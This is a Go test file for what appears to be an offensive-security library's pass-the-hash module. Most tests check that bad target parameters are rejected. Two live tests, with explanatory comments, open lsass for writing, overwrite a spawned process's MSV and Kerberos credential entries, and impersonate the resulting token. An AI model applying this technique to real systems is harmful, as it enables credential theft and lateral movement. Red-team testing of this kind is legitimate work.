//go:build windows

package sekurlsa

import (
	"bytes"
	"errors"
	"testing"

	"github.com/oioio-space/maldev/testutil"
	"golang.org/x/sys/windows"
)

// terminatePID kills the process at pid and ignores errors. Used by
// the partial-implementation tests that exercise the spawn path —
// each must clean up its own suspended decoy so test runs don't
// accumulate orphaned processes on the Win VM.
func terminatePID(pid uint32) {
	if pid == 0 {
		return
	}
	h, err := windows.OpenProcess(windows.PROCESS_TERMINATE, false, pid)
	if err != nil {
		return
	}
	_ = windows.TerminateProcess(h, 1)
	_ = windows.CloseHandle(h)
}

// validPTHParams is the minimal happy-path Params used as a base for
// the rejection tests below — each test mutates exactly one field
// to the bad shape it asserts against.
func validPTHParams() PTHParams {
	return PTHParams{
		Target: PTHTarget{
			Domain:   "corp.example.com",
			Username: "Administrator",
			NTLM:     bytes.Repeat([]byte{0xAA}, 16),
		},
	}
}

func TestPass_RejectsMissingDomain(t *testing.T) {
	p := validPTHParams()
	p.Target.Domain = ""
	_, err := Pass(p)
	if !errors.Is(err, ErrPTHInvalidTarget) {
		t.Fatalf("Pass: err = %v, want wrap of ErrPTHInvalidTarget", err)
	}
}

func TestPass_RejectsMissingUsername(t *testing.T) {
	p := validPTHParams()
	p.Target.Username = ""
	_, err := Pass(p)
	if !errors.Is(err, ErrPTHInvalidTarget) {
		t.Fatalf("Pass: err = %v, want wrap of ErrPTHInvalidTarget", err)
	}
}

func TestPass_RejectsBadNTLMLength(t *testing.T) {
	cases := [][]byte{
		nil,
		bytes.Repeat([]byte{1}, 8),  // too short
		bytes.Repeat([]byte{1}, 32), // too long
	}
	for _, ntlm := range cases {
		p := validPTHParams()
		p.Target.NTLM = ntlm
		_, err := Pass(p)
		if !errors.Is(err, ErrPTHInvalidTarget) {
			t.Errorf("NTLM len=%d: err = %v, want wrap of ErrPTHInvalidTarget", len(ntlm), err)
		}
	}
}

func TestPass_RejectsBadAES128Length(t *testing.T) {
	p := validPTHParams()
	p.Target.AES128 = bytes.Repeat([]byte{1}, 17) // not empty, not 16
	_, err := Pass(p)
	if !errors.Is(err, ErrPTHInvalidTarget) {
		t.Fatalf("Pass: err = %v, want wrap of ErrPTHInvalidTarget", err)
	}
}

func TestPass_RejectsBadAES256Length(t *testing.T) {
	p := validPTHParams()
	p.Target.AES256 = bytes.Repeat([]byte{1}, 31) // not empty, not 32
	_, err := Pass(p)
	if !errors.Is(err, ErrPTHInvalidTarget) {
		t.Fatalf("Pass: err = %v, want wrap of ErrPTHInvalidTarget", err)
	}
}

// TestPass_LiveMSVWriteBack exercises the live write-back path.
// Intrusive: opens lsass with VM_READ + VM_WRITE and overwrites the
// spawned process's per-LUID credential ciphers.
//
// Pass now wires both write-back paths in parallel:
//
//   - MSV path: in-place overwrite of MSV1_0_PRIMARY_CREDENTIAL when
//     the LUID has a populated MSV LIST_ENTRY; allocation fallback
//     when the entry exists but has no PrimaryCredentials attached.
//   - Kerberos path: per-etype overwrite of KERB_HASHPASSWORD entries
//     when the build's Template registers KerberosPrimaryCredLayout.
//
// NETCREDENTIALS_ONLY-spawned sessions typically land only in the
// Kerberos AVL tree (no MSV LIST_ENTRY) — so success on this test
// commonly looks like KerberosOverwritten=true, MSVOverwritten=false.
// Either flag set proves the technique landed.
//
// Skips with ErrPTHNoMatchingLUID only when neither walker turned up
// the spawned LUID (decoy crashed early, lsasrv missed the link, or
// the build's templates don't enumerate the relevant lists).
func TestPass_LiveMSVWriteBack(t *testing.T) {
	testutil.RequireIntrusive(t)

	res, err := Pass(validPTHParams())
	defer terminatePID(res.PID)

	if errors.Is(err, ErrPTHNoMatchingLUID) {
		t.Skipf("PTH write-back: spawned LUID 0x%X not found by either MSV or Kerberos walker (PID=%d): %v",
			res.LogonID, res.PID, err)
	}
	if err != nil {
		t.Fatalf("Pass: %v (PID=%d LUID=0x%X)", err, res.PID, res.LogonID)
	}
	if !res.MSVOverwritten && !res.KerberosOverwritten {
		t.Errorf("neither MSVOverwritten nor KerberosOverwritten set — Pass returned nil but no write landed (warnings=%v)",
			res.Warnings)
	}
	t.Logf("PTH write-back PID=%d LUID=0x%X MSV=%v Kerb=%v warnings=%v",
		res.PID, res.LogonID, res.MSVOverwritten, res.KerberosOverwritten, res.Warnings)
}

func TestPassImpersonate_RejectsMissingDomain(t *testing.T) {
	p := validPTHParams()
	p.Target.Domain = ""
	_, err := PassImpersonate(p)
	if !errors.Is(err, ErrPTHInvalidTarget) {
		t.Fatalf("PassImpersonate: err = %v, want wrap of ErrPTHInvalidTarget", err)
	}
}

// TestPassImpersonate_LiveMSVWriteBack — same dual-path success
// criterion as TestPass_LiveMSVWriteBack plus the SetThreadToken
// step. After the call returns nil, the calling thread holds the
// duplicated impersonation token; teardown lets the test goroutine
// exit which cleans the thread token.
func TestPassImpersonate_LiveMSVWriteBack(t *testing.T) {
	testutil.RequireIntrusive(t)

	res, err := PassImpersonate(validPTHParams())
	defer terminatePID(res.PID)

	if errors.Is(err, ErrPTHNoMatchingLUID) {
		t.Skipf("PTH write-back: spawned LUID 0x%X not found by either MSV or Kerberos walker (PID=%d): %v",
			res.LogonID, res.PID, err)
	}
	if err != nil {
		t.Fatalf("PassImpersonate: %v (PID=%d LUID=0x%X)", err, res.PID, res.LogonID)
	}
	if !res.MSVOverwritten && !res.KerberosOverwritten {
		t.Errorf("neither MSVOverwritten nor KerberosOverwritten set (warnings=%v)", res.Warnings)
	}
	t.Logf("PTH+impersonate PID=%d LUID=0x%X MSV=%v Kerb=%v warnings=%v",
		res.PID, res.LogonID, res.MSVOverwritten, res.KerberosOverwritten, res.Warnings)
}

// Cross-platform TestMutateMSVPrimary_* + TestPTHSentinels_AreDistinct
// live in pth_msv_test.go (no build tag) since the symbols they cover
// are defined in pth.go and pth_msv.go.
